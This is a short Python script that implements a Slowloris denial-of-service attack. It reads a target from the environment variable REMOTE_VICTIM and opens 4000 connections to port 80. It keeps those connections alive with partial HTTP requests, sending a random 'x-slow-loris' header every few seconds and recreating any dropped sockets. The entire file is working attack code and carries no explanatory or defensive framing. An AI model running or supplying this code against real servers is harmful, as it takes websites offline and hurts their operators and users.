import socket
import time
import random
import os


ip = os.environ['REMOTE_VICTIM']
socket_count = 4000
sockets = []
headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
]


def create_socket():
    s_ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_.settimeout(5)
    s_.connect((ip, 80))
    s_.send(bytes("GET / HTTP/1.1\r\n".encode("utf-8")))
    for header_ in headers:
        s_.send(bytes("{}\r\n".format(header_).encode("utf-8")))
    return s_


i = socket_count
print("Creating sockets to victim...", ip)
while i > 0:
    try:
        sockets.append(create_socket())
        i = i - 1
    except socket.error:
        print("Socket creation failed")
print("Sockets created")


while True:
    for s in sockets:
        new_sock_cnt = socket_count - len(sockets)
        if new_sock_cnt > 0:
            print("Recreating ", new_sock_cnt, " sockets")
            for _ in range(new_sock_cnt):
                try:
                    sockets.append(create_socket())
                except socket.error:
                    print("Failed to recreate socket")
            print("Live sockets ", len(sockets))
        try:
            randint = random.randint(1, 500000)
            header = "x-slow-loris-{}: {}\r\n".format(randint, randint).encode("utf-8")
            print("Header sent", header, s.send(bytes(header)))
        except socket.error:
            print("Error sending next header")
            sockets.remove(s)
        time.sleep(5)


